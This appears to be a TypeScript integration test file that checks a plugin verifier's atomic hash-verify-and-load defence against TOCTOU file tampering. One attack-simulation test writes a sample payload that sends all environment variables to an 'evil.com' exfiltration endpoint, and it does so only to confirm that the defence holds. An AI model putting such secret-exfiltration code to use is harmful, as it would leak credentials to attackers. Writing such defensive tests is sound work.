/**
 * TOCTOU Prevention Integration Tests
 *
 * Tests the atomic verify-and-load pattern to prevent
 * time-of-check-time-of-use attacks.
 */

import fs from "node:fs";
import path from "node:path";

import { afterEach, beforeEach, describe, expect, it } from "vitest";

import {
  computeFileHash,
  computeFileHashWithContent,
  verifyFileHashWithContent,
} from "../../hash.js";
import { verifyPluginSecurity } from "../../verify.js";
import {
  cleanupTempDir,
  createPermissiveConfig,
  createSafePlugin,
  createStrictConfig,
  createTempDir,
  createVerifyContext,
} from "./setup.js";

describe("toctou-prevention", () => {
  let tempDir: string;

  beforeEach(() => {
    tempDir = createTempDir("toctou-test-");
  });

  afterEach(() => {
    cleanupTempDir(tempDir);
  });

  describe("verifyFileHashWithContent", () => {
    it("should return content buffer when hash matches", () => {
      const plugin = createSafePlugin(tempDir);
      const expectedHash = computeFileHash(plugin.entryPath).formatted;

      const result = verifyFileHashWithContent(plugin.entryPath, expectedHash);

      expect(result.valid).toBe(true);
      expect(result.content).toBeDefined();
      expect(result.content).toBeInstanceOf(Buffer);

      // Content should match file contents
      const fileContent = fs.readFileSync(plugin.entryPath);
      expect(result.content!.equals(fileContent)).toBe(true);
    });

    it("should not return content when hash does not match", () => {
      const plugin = createSafePlugin(tempDir);
      const wrongHash = "sha256:" + "a".repeat(64);

      const result = verifyFileHashWithContent(plugin.entryPath, wrongHash);

      expect(result.valid).toBe(false);
      expect(result.content).toBeUndefined();
    });

    it("should return actual hash for diagnostics", () => {
      const plugin = createSafePlugin(tempDir);
      const wrongHash = "sha256:" + "a".repeat(64);

      const result = verifyFileHashWithContent(plugin.entryPath, wrongHash);

      expect(result.actualHash).toBeDefined();
      expect(result.actualHash.algorithm).toBe("sha256");
      expect(result.actualHash.hash).toHaveLength(64);
    });
  });

  describe("computeFileHashWithContent", () => {
    it("should return hash and content atomically", () => {
      const plugin = createSafePlugin(tempDir);

      const result = computeFileHashWithContent(plugin.entryPath);

      expect(result.algorithm).toBe("sha256");
      expect(result.hash).toHaveLength(64);
      expect(result.formatted).toMatch(/^sha256:[a-f0-9]{64}$/);
      expect(result.content).toBeInstanceOf(Buffer);

      // Hash should match the content
      const expectedHash = computeFileHash(plugin.entryPath);
      expect(result.hash).toBe(expectedHash.hash);
    });

    it("should enable atomic verify-and-use pattern", () => {
      const plugin = createSafePlugin(tempDir);

      // Simulate atomic verification
      const verified = computeFileHashWithContent(plugin.entryPath);
      const expectedHash = plugin.manifest.security?.contentHash;

      // Store the verified content
      const verifiedContent = verified.content;

      // Now simulate file modification after verification
      fs.writeFileSync(plugin.entryPath, "// TAMPERED CODE\nmalicious();");

      // The verified content should still be the original
      const originalContent = fs.readFileSync(plugin.entryPath, "utf-8");
      expect(originalContent).toContain("TAMPERED");

      // But our verified buffer has the safe content
      expect(verifiedContent.toString()).not.toContain("TAMPERED");
      expect(verifiedContent.toString()).toContain("safe-echo");
    });
  });

  describe("verifyPluginSecurity with atomic content", () => {
    it("should return verifiedContent for use by loader", () => {
      const plugin = createSafePlugin(tempDir);
      const config = createPermissiveConfig({ enableScanning: false });
      const ctx = createVerifyContext(plugin, config);

      const result = verifyPluginSecurity(ctx);

      expect(result.ok).toBe(true);
      expect(result.verifiedContent).toBeDefined();
      expect(result.verifiedContent?.entryPath).toBe(plugin.entryPath);
      expect(result.verifiedContent?.content).toBeInstanceOf(Buffer);
    });

    it("should not return verifiedContent when hash verification fails", () => {
      // Create a plugin with wrong hash in manifest
      const plugin = createSafePlugin(tempDir);

      // Overwrite the manifest with wrong hash
      plugin.manifest.security = { contentHash: "sha256:" + "b".repeat(64) };
      fs.writeFileSync(plugin.manifestPath, JSON.stringify(plugin.manifest, null, 2));

      const config = createStrictConfig({ enableScanning: false });
      const ctx = createVerifyContext(plugin, config);

      const result = verifyPluginSecurity(ctx);

      expect(result.ok).toBe(false);
      expect(result.verifiedContent).toBeUndefined();
    });

    it("should not return verifiedContent when mode is off", () => {
      const plugin = createSafePlugin(tempDir);
      const config = createPermissiveConfig({ enableScanning: false });
      config.mode = "off";
      const ctx = createVerifyContext(plugin, config);

      const result = verifyPluginSecurity(ctx);

      expect(result.ok).toBe(true);
      expect(result.level).toBe("unsigned");
      // In off mode, no verification is performed so no verified content
      expect(result.verifiedContent).toBeUndefined();
    });

    it("should not return verifiedContent for bundled plugins", () => {
      const plugin = createSafePlugin(tempDir);
      const config = createPermissiveConfig({ enableScanning: false, trustBundled: true });
      const ctx = createVerifyContext(plugin, config, { origin: "bundled" });

      const result = verifyPluginSecurity(ctx);

      expect(result.ok).toBe(true);
      expect(result.level).toBe("verified");
      // Bundled plugins are implicitly trusted, no content verification
      expect(result.verifiedContent).toBeUndefined();
    });
  });

  describe("TOCTOU attack simulation", () => {
    it("should prevent reading modified file after hash verification", () => {
      const plugin = createSafePlugin(tempDir);
      const originalHash = computeFileHash(plugin.entryPath).formatted;

      // Step 1: Verify hash and get content atomically
      const verifyResult = verifyFileHashWithContent(plugin.entryPath, originalHash);
      expect(verifyResult.valid).toBe(true);

      const safeContent = verifyResult.content!;

      // Step 2: Simulate attacker modifying file between verify and load
      const maliciousCode = `
        // MALICIOUS CODE INJECTED
        const secrets = process.env;
        fetch('https://evil.com/exfil', { method: 'POST', body: JSON.stringify(secrets) });
      `;
      fs.writeFileSync(plugin.entryPath, maliciousCode);

      // Step 3: Verify the file on disk is now malicious
      const currentContent = fs.readFileSync(plugin.entryPath, "utf-8");
      expect(currentContent).toContain("MALICIOUS");
      expect(currentContent).toContain("evil.com");

      // Step 4: But our verified content is still safe
      const safeContentStr = safeContent.toString("utf-8");
      expect(safeContentStr).not.toContain("MALICIOUS");
      expect(safeContentStr).not.toContain("evil.com");
      expect(safeContentStr).toContain("safe-echo");

      // Step 5: Using the verified content prevents the attack
      // (In real usage, the loader would use safeContent directly)
      const hashOfVerifiedContent = computeFileHash(plugin.entryPath);
      expect(hashOfVerifiedContent.formatted).not.toBe(originalHash); // File changed

      // But our verified buffer still has correct hash
      const { hash } = computeFileHashWithContent(plugin.entryPath);
      expect(hash).not.toBe(verifyResult.actualHash.hash); // Current file differs
    });

    it("should integrate with full verification flow", () => {
      const plugin = createSafePlugin(tempDir);
      const config = createPermissiveConfig({ enableScanning: false });
      const ctx = createVerifyContext(plugin, config);

      // Step 1: Run full verification
      const result = verifyPluginSecurity(ctx);
      expect(result.ok).toBe(true);

      // Store the verified content
      const verifiedContent = result.verifiedContent;
      expect(verifiedContent).toBeDefined();

      // Step 2: Tamper with file
      fs.writeFileSync(plugin.entryPath, "// EVIL CODE");

      // Step 3: Loader should use verified content, not re-read file
      // The verified content is still the original safe content
      expect(verifiedContent!.content.toString()).toContain("safe-echo");
      expect(verifiedContent!.content.toString()).not.toContain("EVIL");
    });
  });

  describe("edge cases", () => {
    it("should handle missing security metadata gracefully", () => {
      const plugin = createSafePlugin(tempDir);

      // Remove security metadata
      delete plugin.manifest.security;
      fs.writeFileSync(plugin.manifestPath, JSON.stringify(plugin.manifest, null, 2));

      const config = createPermissiveConfig({ enableScanning: false });
      const ctx = createVerifyContext(plugin, config);

      const result = verifyPluginSecurity(ctx);

      // Should pass in permissive mode but with no verified content
      // since there's no hash to verify against
      expect(result.ok).toBe(true);
      expect(result.level).toBe("unsigned");
      expect(result.verifiedContent).toBeUndefined();
    });

    it("should handle empty content hash", () => {
      const plugin = createSafePlugin(tempDir);

      // Set empty content hash
      plugin.manifest.security = { contentHash: "" };
      fs.writeFileSync(plugin.manifestPath, JSON.stringify(plugin.manifest, null, 2));

      const config = createPermissiveConfig({ enableScanning: false });
      const ctx = createVerifyContext(plugin, config);

      const result = verifyPluginSecurity(ctx);

      // Empty hash is treated as "no hash" - verification skipped
      expect(result.ok).toBe(true);
    });

    it("should handle binary content in plugins", () => {
      // Create a plugin with some binary-like content
      const pluginDir = path.join(tempDir, "binary-test");
      fs.mkdirSync(pluginDir, { recursive: true });

      const entryPath = path.join(pluginDir, "index.js");
      const binaryContent = Buffer.from([
        0x2f, 0x2f, 0x20, // "// "
        0x54, 0x65, 0x73, 0x74, // "Test"
        0x0a, // newline
        0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, // "export"
        0x20, 0x66, 0x75, 0x6e, 0x63, 0x74, 0x69, 0x6f, 0x6e, // " function"
        0x20, 0x72, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, // " register"
        0x28, 0x29, 0x20, 0x7b, 0x7d, // "() {}"
      ]);
      fs.writeFileSync(entryPath, binaryContent);

      const hash = computeFileHash(entryPath);
      const result = verifyFileHashWithContent(entryPath, hash.formatted);

      expect(result.valid).toBe(true);
      expect(result.content!.equals(binaryContent)).toBe(true);
    });

    it("should handle large files efficiently", () => {
      const pluginDir = path.join(tempDir, "large-test");
      fs.mkdirSync(pluginDir, { recursive: true });

      const entryPath = path.join(pluginDir, "index.js");

      // Create a large file (~1MB)
      const largeContent =
        "// Large file\nexport function register() {\n" +
        "  const data = `" +
        "x".repeat(1024 * 1024) +
        "`;\n}\n";

      fs.writeFileSync(entryPath, largeContent);

      const start = Date.now();
      const hash = computeFileHash(entryPath);
      const result = verifyFileHashWithContent(entryPath, hash.formatted);
      const elapsed = Date.now() - start;

      expect(result.valid).toBe(true);
      // Should complete in reasonable time (under 1 second even for 1MB)
      expect(elapsed).toBeLessThan(1000);
    });
  });
});
